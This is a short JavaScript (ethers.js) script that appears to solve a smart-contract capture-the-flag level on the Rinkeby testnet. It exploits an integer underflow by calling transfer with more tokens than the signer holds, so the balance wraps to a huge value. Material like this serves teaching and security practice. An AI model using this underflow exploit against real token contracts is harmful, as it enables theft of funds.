const dotenv = require("dotenv");
const ethers = require("ethers");

dotenv.config({ path: '../../.env'});

const { RINKEBY_URL, MNEMONIC } = process.env;

const provider = new ethers.providers.JsonRpcProvider(RINKEBY_URL);
const wallet = ethers.Wallet.fromMnemonic(MNEMONIC);
const signer = wallet.connect(provider);

const abi = [
    "function transfer(address _to, uint _value) public returns (bool)",
    "function balanceOf(address _owner) public view returns (uint balance)",
]

const instanceAddress = "0x3B00e6dcadeA99A43a1a69426ff926FDaB19a57C"

const solve = async () => {
    try {
        const interface = new ethers.utils.Interface(abi);
        const contract = new ethers.Contract(instanceAddress, interface, signer);
        let tx = await contract.transfer(contract.address, 99999999) // 21000000 - 99999999 will cause an underflow and set my balance to abs(21000000 - 99999999)
        const receipt = await tx.wait();
        console.log(receipt);
    } catch (e) {
        console.error(e);
    }
}

solve();